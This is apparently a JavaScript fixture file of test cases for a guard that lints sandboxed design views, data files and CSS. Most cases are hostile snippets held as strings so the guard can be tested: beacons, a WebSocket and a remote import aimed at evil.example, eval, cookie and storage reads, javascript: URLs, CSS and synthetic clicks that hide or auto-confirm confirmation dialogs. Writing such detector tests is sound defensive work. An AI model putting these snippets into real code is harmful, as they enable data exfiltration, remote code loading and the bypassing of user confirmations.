// Fixtures for scripts/test-guard.mjs: one small source per rule, plus valid sources that must pass.
// kind: "code" (a design view/part), "data" (design/copy.js or routes.js), "css" (design/theme.css).
// expect: the rule id that MUST be reported, or null when the source must pass cleanly.
// (Strings, not files, so these hostile snippets are never loadable by anything.)
const view = (body) => `export default function view(root, ctx) { ${body} }`;

export const CASES = [
  // ── valid ──
  { name: "valid view", kind: "code", expect: null, src: `import { helper } from "../parts/helper.js";
export default function view(root, ctx) {
  const { h, button } = ctx.ui;
  const { t, can, data } = ctx;
  const { shopName } = ctx.session;
  const { id } = ctx.route.params;
  root.append(h("p", { class: "muted" }, t("home.greeting", { shop: shopName })), button(t("common.cancel"), { onClick: () => ctx.navigate("/") }));
  const rows = [1, 2, 3];
  const first = rows[0];
  if (can("order.view")) data.listOrders({}).then((r) => r.orders.map((o) => o.id));
  return first + id + helper;
}` },
  { name: "valid data file", kind: "data", expect: null, src: `export default {\n  // comment\n  "home.greeting": "你好，{shop}",\n  routes: { a: "views/a.js" },\n  list: [1, 2, -3, true, null],\n};` },
  { name: "valid css", kind: "css", expect: null, src: `/* theme */\n:root { --accent: #d4688a; }\n.card { background: url(assets/bg.svg); border-radius: 8px; }\n@media (min-width: 900px) { .page-title { font-size: 40px; } }\n.x::before { content: "\\201C"; }` },

  // ── JavaScript: network, storage, dynamic code ──
  { name: "fetch", kind: "code", expect: "js/forbidden-identifier", src: view(`fetch("/api/v1/admin/me");`) },
  { name: "XMLHttpRequest", kind: "code", expect: "js/forbidden-identifier", src: view(`const x = new XMLHttpRequest(); x.open("GET", "/a");`) },
  { name: "WebSocket", kind: "code", expect: "js/forbidden-identifier", src: view(`new WebSocket("wss://evil.example/x");`) },
  { name: "sendBeacon", kind: "code", expect: "js/forbidden-identifier", src: view(`ctx.x.sendBeacon("/x", "data");`) },
  { name: "localStorage", kind: "code", expect: "js/forbidden-identifier", src: view(`localStorage.setItem("a", "b");`) },
  { name: "sessionStorage", kind: "code", expect: "js/forbidden-identifier", src: view(`sessionStorage.getItem("admin.refresh");`) },
  { name: "indexedDB", kind: "code", expect: "js/forbidden-identifier", src: view(`indexedDB.open("x");`) },
  { name: "document.cookie", kind: "code", expect: "js/forbidden-identifier", src: view(`const c = ctx.x.cookie;`) },
  { name: "eval", kind: "code", expect: "js/forbidden-identifier", src: view(`eval("1+1");`) },
  { name: "new Function", kind: "code", expect: "js/forbidden-identifier", src: view(`const f = new Function("return 1");`) },
  { name: "dynamic import()", kind: "code", expect: "js/dynamic-import", src: `export default async function view(root, ctx) { const m = await import("../../lib/api.js"); }` },
  { name: "import.meta", kind: "code", expect: "js/forbidden-identifier", src: view(`const u = import.meta.url;`) },
  { name: "Worker", kind: "code", expect: "js/forbidden-identifier", src: view(`new Worker("/w.js");`) },
  { name: "new Image beacon", kind: "code", expect: "js/forbidden-identifier", src: view(`new Image().src = "/x?d=1";`) },
  { name: "constructor property", kind: "code", expect: "js/forbidden-identifier", src: view(`const F = ctx.ui.h.constructor;`) },
  { name: "constructor string", kind: "code", expect: "js/banned-string", src: view(`const n = "constructor";`) },

  // ── JavaScript: imports of the core ──
  { name: "import lib", kind: "code", expect: "js/import", src: `import { api } from "../../lib/api.js";\nexport default function view(root, ctx) { api("GET", "/admin/me"); }` },
  { name: "import ui", kind: "code", expect: "js/import", src: `import { h } from "../../ui/kit.js";\nexport default function view(root, ctx) { root.append(h("p")); }` },
  { name: "import core", kind: "code", expect: "js/import", src: `import { actions } from "../../core/actions.js";\nexport default function view(root, ctx) { return actions; }` },
  { name: "import remote URL", kind: "code", expect: "js/import", src: `import x from "https://evil.example/x.js";\nexport default function view(root, ctx) {}` },
  { name: "import bare specifier", kind: "code", expect: "js/import", src: `import x from "lodash";\nexport default function view(root, ctx) {}` },
  { name: "import outside design", kind: "code", expect: "js/import", src: `import x from "../../app.js";\nexport default function view(root, ctx) {}` },
  { name: "re-export from core", kind: "code", expect: "js/import", src: `export { api } from "../../lib/api.js";\nexport default function view(root, ctx) {}` },

  // ── JavaScript: DOM, markup, handlers, navigation ──
  { name: "createElement script", kind: "code", expect: "js/forbidden-identifier", src: view(`const s = ctx.x.createElement("script");`) },
  { name: "script tag in a string", kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("div", {}, "<script src=x></script>");`) },
  { name: "iframe element name", kind: "code", expect: "js/banned-string", src: view(`ctx.ui.h("iframe", { src: "/x" });`) },
  { name: "object element name", kind: "code", expect: "js/banned-string", src: view(`ctx.ui.h("object", { data: "/x" });`) },
  { name: "string onclick", kind: "code", expect: "js/event-handler-string", src: view(`ctx.ui.h("button", { onclick: "alert(1)" }, "x");`) },
  { name: "string onerror (quoted key)", kind: "code", expect: "js/event-handler-string", src: view(`ctx.ui.h("img", { "onerror": "alert(1)" });`) },
  { name: "assigning .onclick", kind: "code", expect: "js/event-handler-assignment", src: view(`const b = ctx.ui.h("button"); b.onclick = () => 1;`) },
  { name: "innerHTML", kind: "code", expect: "js/forbidden-identifier", src: view(`root.innerHTML = "<b>x</b>";`) },
  { name: "outerHTML", kind: "code", expect: "js/forbidden-identifier", src: view(`root.outerHTML = "x";`) },
  { name: "insertAdjacentHTML", kind: "code", expect: "js/forbidden-identifier", src: view(`root.insertAdjacentHTML("beforeend", "x");`) },
  { name: "setAttribute", kind: "code", expect: "js/forbidden-identifier", src: view(`root.setAttribute("onclick", "x()");`) },
  { name: "window.location assignment", kind: "code", expect: "js/forbidden-identifier", src: view(`window.location = "https://evil.example";`) },
  { name: "location.href", kind: "code", expect: "js/forbidden-identifier", src: view(`location.href = "/x";`) },
  { name: "document access", kind: "code", expect: "js/forbidden-identifier", src: view(`document.body.append(root);`) },
  { name: "globalThis", kind: "code", expect: "js/forbidden-identifier", src: view(`const g = globalThis;`) },
  { name: "bare parent", kind: "code", expect: "js/forbidden-identifier", src: view(`parent.postMessage("x", "*");`) },
  { name: "bare top", kind: "code", expect: "js/forbidden-identifier", src: view(`const t = top;`) },
  { name: "setTimeout with a string", kind: "code", expect: "js/timer-string", src: view(`setTimeout("alert(1)", 10);`) },
  { name: "form action", kind: "code", expect: "js/form-action", src: view(`ctx.ui.h("form", { action: "/post" });`) },
  { name: "external URL string", kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("img", { src: "https://evil.example/p.png?d=1" });`) },
  { name: "javascript: URL", kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("a", { href: "javascript:alert(1)" }, "x");`) },

  // ── JavaScript: obfuscation ──
  { name: "computed access with concatenation", kind: "code", expect: "js/computed-access", src: view(`const k = "a"; const f = ctx.ui["h" + k]();`) },
  { name: "computed access with a template", kind: "code", expect: "js/computed-access", src: view("const f = ctx.ui[`h`]();") },
  { name: "computed access with a call", kind: "code", expect: "js/computed-access", src: view(`const f = ctx.ui[String(1)]();`) },
  { name: "string concatenation", kind: "code", expect: "js/string-concat", src: view(`const k = "con" + "structor";`) },

  // ── JavaScript: only names listed in lib/public-api.json ──
  { name: "unknown ctx namespace", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.secretStore.read();`) },
  { name: "unknown ctx.ui function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.ui.eatCookies();`) },
  { name: "unknown ctx.actions function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.actions.deleteEverything();`) },
  { name: "unknown ctx.data function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.data.dumpDatabase();`) },
  { name: "destructuring an unknown name", kind: "code", expect: "js/ctx-unknown", src: view(`const { h, rawFetch } = ctx.ui;`) },
  { name: "alias of an unknown action", kind: "code", expect: "js/ctx-unknown", src: view(`const { actions } = ctx; actions.wipe();`) },
  { name: "computed access on ctx", kind: "code", expect: "js/ctx-unknown", src: view(`const n = "ui"; ctx[n].h();`) },
  { name: "reading the token", kind: "code", expect: "js/ctx-unknown", src: view(`const x = ctx.auth.token;`) },

  // ── data files must be pure data ──
  { name: "data: a call", kind: "data", expect: "js/data-not-pure", src: `export default { "a": String("x") };` },
  { name: "data: an arrow function", kind: "data", expect: "js/data-not-pure", src: `export default { "a": () => 1 };` },
  { name: "data: template with an expression", kind: "data", expect: "js/data-not-pure", src: "export default { \"a\": `x${1}` };" },
  { name: "data: a spread", kind: "data", expect: "js/data-not-pure", src: `const base = { a: "x" };\nexport default { ...base };` },
  { name: "data: an import", kind: "data", expect: "js/data-not-pure", src: `import x from "../lib/api.js";\nexport default { a: "x" };` },
  { name: "data: concatenation", kind: "data", expect: "js/data-not-pure", src: `export default { "a": "x" + "y" };` },
  { name: "data: no export default", kind: "data", expect: "js/data-not-pure", src: `const a = { "a": "x" };` },

  // ── CSS ──
  { name: "css @import remote", kind: "css", expect: "css/import", src: `@import url("https://fonts.googleapis.com/css2?family=X");\n.a { color: red; }` },
  { name: "css @import local", kind: "css", expect: "css/import", src: `@import "other.css";` },
  { name: "css url remote", kind: "css", expect: "css/url", src: `.a { background: url(https://evil.example/p.png); }` },
  { name: "css url protocol-relative", kind: "css", expect: "css/url", src: `.a { background: url(//evil.example/p.png); }` },
  { name: "css url outside assets", kind: "css", expect: "css/url", src: `.a { background: url(../lib/api.js); }` },
  { name: "css url data:text/html", kind: "css", expect: "css/url", src: `.a { background: url("data:text/html;base64,AAAA"); }` },
  { name: "css image-set string", kind: "css", expect: "css/url", src: `.a { background-image: image-set("https://evil.example/x.png" 1x); }` },
  { name: "css expression()", kind: "css", expect: "css/expression", src: `.a { width: expression(alert(1)); }` },
  { name: "css behavior / -moz-binding", kind: "css", expect: "css/behavior", src: `.a { behavior: url(x.htc); }` },
  { name: "css escape hiding url(", kind: "css", expect: "css/escape", src: `.a { background: u\\72l(https://evil.example/x); }` },
  { name: "css hides the confirm button", kind: "css", expect: "css/hides-dialog", src: `dialog.dlg [data-testid="confirm-yes"] { display: none; }` },
  { name: "css hides the fixed confirmation warning", kind: "css", expect: "css/hides-dialog", src: `.dlg__warning { display: none; }` },
  { name: "css hides the warning by test id", kind: "css", expect: "css/hides-dialog", src: `[data-testid="confirm-warning"] { font-size: 0; }` },
  { name: "css styles the fixed warning (allowed)", kind: "css", expect: null, src: `.dlg__warning { color: #b00020; font-weight: 600; }` },
  { name: "css disables dialogs", kind: "css", expect: "css/hides-dialog", src: `dialog { pointer-events: none; }` },

  // ── content store (platform content documents): what a design may call, and what a hostile one cannot ──
  { name: "valid content screen", kind: "code", expect: null, src: `export default async function view(root, ctx) {
  const { h, button, toast } = ctx.ui;
  const doc = await ctx.data.getContentDocument(ctx.route.params.key);
  const form = ctx.ui.contentForm(doc.schemaNode, doc.draft, { readOnly: !ctx.can("content.edit") });
  const field = ctx.ui.contentField(doc.schemaNode, "/title", doc.draft);
  const dry = ctx.data.dryRunContentSchema;
  root.append(form.el, field.el, button("x", { onClick: async () => {
    try { const r = await ctx.actions.saveContentDocument(doc.key, form.read(), { rev: doc.rev }); form.setErrors({}); return r.doc; } catch (e) { form.setErrors(e.fields || {}); toast(ctx.errorMessage(e), "error"); }
  } }), button("y", { onClick: () => ctx.actions.registerContentSchema() }));
  return dry;
}` },
  { name: "a content function that does not exist (direct registration)", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.actions.putContentSchema({ confirm: true });`) },
  { name: "a content function that does not exist (skip the dialog)", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.actions.registerContentSchemaNow();`) },
  { name: "a data function that writes the schema", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.data.registerContentSchema();`) },
  { name: "reading the schema file source from the design", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.data.readContentSchemaFile();`) },
  { name: "unpublishing by raw publish endpoint", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.actions.publishDocumentRaw("home");`) },
  { name: "content form builder internals", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.ui.contentFormUnchecked({}, {});`) },
  { name: "reaching the admin config (site origin) from a view", kind: "code", expect: "js/forbidden-identifier", src: view(`const o = window.ADMIN_CONFIG.siteOrigin;`) },
  { name: "posting the content to another site", kind: "code", expect: "js/forbidden-identifier", src: view(`const f = ctx.ui.contentForm({}, {}); fetch("/x", { body: JSON.stringify(f.read()) });`) },
  { name: "css hides the registration report", kind: "css", expect: "css/hides-dialog", src: `.dlg__detail { display: none; }` },

  // ── D12 (v0.4.2): dialogs, popovers, synthetic input, DOM traversal ──
  { name: "D12 .showModal(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.showModal();") },
  { name: "D12 .showPopover(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.showPopover();") },
  { name: "D12 .hidePopover(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.hidePopover();") },
  { name: "D12 .togglePopover(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.togglePopover();") },
  { name: "D12 .requestFullscreen(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.requestFullscreen();") },
  { name: "D12 .requestPointerLock(", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.requestPointerLock();") },
  { name: "D12 .show( on anything", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.show();") },
  { name: "D12 .close( on anything", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.close();") },
  { name: "D12 .close( on a call result", kind: "code", expect: "js/dialog-api", src: view("const { h, button } = ctx.ui; ctx.ui.showDialog({}).dialog.close();") },
  { name: "D12 computed [\"close\"]", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d[\"close\"]();") },
  { name: "D12 popover prop", kind: "code", expect: "js/popover-inert", src: view("const { h, button } = ctx.ui; h(\"div\", { popover: \"auto\" }, \"x\");") },
  { name: "D12 popover property", kind: "code", expect: "js/popover-inert", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.popover = \"manual\";") },
  { name: "D12 inert prop", kind: "code", expect: "js/popover-inert", src: view("const { h, button } = ctx.ui; h(\"div\", { inert: true }, \"x\");") },
  { name: "D12 inert property", kind: "code", expect: "js/popover-inert", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.inert = true;") },
  { name: "D12 popover as a string", kind: "code", expect: "js/dialog-element", src: view("const { h, button } = ctx.ui; h(\"div\", { \"popover\": \"auto\" });") },
  { name: "D12 dialog tag", kind: "code", expect: "js/dialog-element", src: view("const { h, button } = ctx.ui; h(\"dialog\", {}, \"x\");") },
  { name: "D12 dialog tag in a template", kind: "code", expect: "js/dialog-element", src: view("const s = `<dialog open>x</dialog>`;") },
  { name: "D12 .click( on a non-own element", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const b = other.getBtn(); b.click();") },
  { name: "D12 .click( on an event target", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; h(\"div\", { onClick: (e) => e.target.click() });") },
  { name: "D12 dispatchEvent", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const d = h(\"div\"); d.dispatchEvent(1);") },
  { name: "D12 new MouseEvent", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const e = new MouseEvent(\"click\");") },
  { name: "D12 new KeyboardEvent", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const e = new KeyboardEvent(\"keydown\");") },
  { name: "D12 new Event", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const e = new Event(\"submit\");") },
  { name: "D12 requestSubmit", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const f = h(\"form\"); f.requestSubmit();") },
  { name: "D12 .submit(", kind: "code", expect: "js/synthetic-input", src: view("const { h, button } = ctx.ui; const f = h(\"form\"); f.submit();") },
  { name: "D12 confirm-yes string", kind: "code", expect: "js/core-ui-selector", src: view("const { h, button } = ctx.ui; const id = \"confirm-yes\";") },
  { name: "D12 confirm-yes selector", kind: "code", expect: "js/core-ui-selector", src: view("const { h, button } = ctx.ui; const s = '[data-testid=\"confirm-yes\"]';") },
  { name: "D12 confirm-warning prop value", kind: "code", expect: "js/core-ui-selector", src: view("const { h, button } = ctx.ui; h(\"span\", { \"data-testid\": \"confirm-warning\" });") },
  { name: "D12 confirm-yes in a template", kind: "code", expect: "js/core-ui-selector", src: view("const t = `confirm-yes`;") },
  { name: "D12 .ownerDocument", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.ownerDocument;") },
  { name: "D12 .getRootNode", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.getRootNode;") },
  { name: "D12 .parentNode", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.parentNode;") },
  { name: "D12 .parentElement", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.parentElement;") },
  { name: "D12 .offsetParent", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.offsetParent;") },
  { name: "D12 .previousElementSibling", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.previousElementSibling;") },
  { name: "D12 .nextElementSibling", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = root.nextElementSibling;") },
  { name: "D12 root.closest", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; root.closest(\"body\");") },
  { name: "D12 closest on an unknown receiver", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const e = other(); e.closest(\".dlg\");") },
  { name: "D12 querySelector on an unknown receiver", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const e = other(); e.querySelector(\"dialog\");") },
  { name: "D12 querySelectorAll on a call result", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; other().querySelectorAll(\"button\");") },
  { name: "D12 querySelector on a showDialog result", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const r = ctx.ui.showDialog({}); r.dialog.querySelector(\"button\");") },
  { name: "D12 ctx.ui.$ with no element (whole document)", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; ctx.ui.$(\"[data-testid=x]\");") },
  { name: "D12 $ with no element", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const { $ } = ctx.ui; $(\".dlg button\");") },
  { name: "D12 querySelector name as a string", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const m = \"querySelector\";") },
  { name: "D12 getElementById", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; const x = ctx.x.getElementById(\"a\");") },
  { name: "D12 event.target.closest with a computed selector", kind: "code", expect: "js/dom-escape", src: view("const { h, button } = ctx.ui; h(\"div\", { onClick: (e) => e.target.closest(sel) });") },
  { name: "D12 valid: hidden file input clicked from a button (existing pattern)", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; const fileIn = h(\"input\", { type: \"file\", hidden: true }); const b = button(\"x\", { onClick: () => fileIn.click() }); root.append(fileIn, b);") },
  { name: "D12 valid: querySelector/closest on own elements", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; const card = h(\"div\", { class: \"a\" }, h(\"p\", { class: \"muted\" })); card.querySelector(\".muted\").textContent = \"x\"; const f = h(\"input\"); f.closest(\".field\"); root.append(card);") },
  { name: "D12 valid: root.querySelectorAll and event.target.closest literal", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; for (const a of root.querySelectorAll(\"[data-nav]\")) a.classList.toggle(\"on\", true); const l = h(\"div\"); l.addEventListener(\"click\", (e) => { if (e.target.closest(\"a\")) l.remove(); });") },
  { name: "D12 valid: ctx.ui.$ with an own element", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; const box = h(\"div\"); ctx.ui.$(\".x\", box); const { $ } = ctx.ui; $(\".y\", root);") },
  { name: "D12 valid: core functions named submit/close and a dialog close handle", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; ctx.auth.passwordSetup.submit(\"a\", \"b\"); ctx.ui.showDialog({ title: \"x\", content: h(\"p\", {}, \"y\"), actions: [{ label: \"ok\", onClick: ({ close }) => close() }] }); const f = h(\"form\"); f.addEventListener(\"submit\", (e) => e.preventDefault());") },
  { name: "D12 valid: dialog classes and words in text", kind: "code", expect: null, src: view("const { h, button } = ctx.ui; h(\"div\", { class: \"dlg__msg\" }, \"x\"); const text = \"dialog box popover info\";") },
  { name: "D12 valid: role dialog is only an ARIA value", kind: "code", expect: null, src: view("const { h } = ctx.ui; h(\"div\", { role: \"dialog\", \"aria-modal\": \"true\" }, \"x\");") },
  { name: "D12 css position fixed and z-index stay allowed", kind: "css", expect: null, src: `.toast { position: fixed; z-index: 9999; inset: auto 0 0 0; }\n.sticky { position: sticky; top: 0; z-index: 3; }` },
];
